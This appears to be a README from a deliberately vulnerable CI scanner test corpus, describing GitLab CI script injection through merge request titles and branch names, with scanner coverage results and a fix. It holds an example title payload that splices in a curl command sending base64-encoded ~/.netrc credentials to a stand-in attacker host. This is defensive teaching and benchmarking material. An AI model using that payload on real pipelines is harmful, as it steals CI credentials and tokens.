# Scenario 39: GitLab CI — script injection via `$CI_*` / merge-request variables

**Provider:** GitLab CI/CD

**OWASP CICD-SEC mapping:** CICD-SEC-4 (Poisoned Pipeline Execution)

**Vulnerable pipeline:** [`.gitlab-ci.yml`](.gitlab-ci.yml)

## The pattern

GitLab Runner interpolates `$VAR` references in a `script:` block into the
generated shell script **before** the shell executes it. Several predefined
CI/CD variables are **attacker-controlled** — anyone who can open a merge
request or push a branch sets them:

- `$CI_COMMIT_TITLE` / `$CI_COMMIT_MESSAGE` — first line / full commit message
- `$CI_MERGE_REQUEST_TITLE` / `$CI_MERGE_REQUEST_DESCRIPTION`
- `$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME` / `$CI_COMMIT_REF_NAME` — branch name

When one of these is interpolated directly into a command, the attacker
controls shell **syntax**, not just shell *input*. This is the GitLab twin of
the GitHub Actions `${{ github.event.* }}` injection family (scenarios
[02](../02-script-injection-issue-title/README.md) and
[30–33](../30-script-injection-issue-body/README.md)).

## How an attacker exploits it

Open a merge request whose **title** (or source-branch name) is:

```
x"; curl https://attacker.tld/$(cat ~/.netrc | base64) #
```

The runner expands:

```yaml
script:
  - echo "Building $CI_COMMIT_TITLE"
```

into:

```bash
echo "Building x"; curl https://attacker.tld/$(cat ~/.netrc | base64) #"
```

The runner executes the `curl` with whatever credentials are present in the
job environment (CI/CD variables, the `CI_JOB_TOKEN`, cached cloud creds).

## Expected scanner coverage

Only scanners that statically parse `.gitlab-ci.yml` apply here; the
GitHub-Actions-only scanners (zizmor, KICS, actionlint, octoscan) render `—`
on this row.

| Scanner | Detection |
|---------|-----------|
| pipeline-check | `GL-002` — script injection via untrusted commit/MR context |
| Checkov | — (its `gitlab_ci` ruleset has no `$CI_*` script-injection check) |
| ciguard | — (emits only hygiene/missing-control findings on this file) |

> Reconciled against real `scanner-comparison` SARIF (`regen-readme.py
> --verify`). poutine is GitHub-Actions-only in this comparison and renders
> `—`; its GitLab support is real upstream but its nested-file discovery +
> SARIF path attribution on this corpus is unconfirmed, so it stays scoped out.

## Fix

Never interpolate untrusted metadata into `script:`. Pass it through the
environment so the shell receives it as a literal value, and quote it:

```yaml
greet:
  variables:
    TITLE: $CI_COMMIT_TITLE        # bound as an env var, not spliced inline
  script:
    - echo "Building $TITLE"        # shell variable expansion, no re-parsing
```

Better still, don't echo attacker-controlled metadata at all, and gate
secret-bearing jobs to protected branches / the parent project.

## References

- GitLab Docs — Pipeline security:
  https://docs.gitlab.com/ci/pipeline_security/
- GitLab Docs — Predefined CI/CD variables:
  https://docs.gitlab.com/ci/variables/predefined_variables/
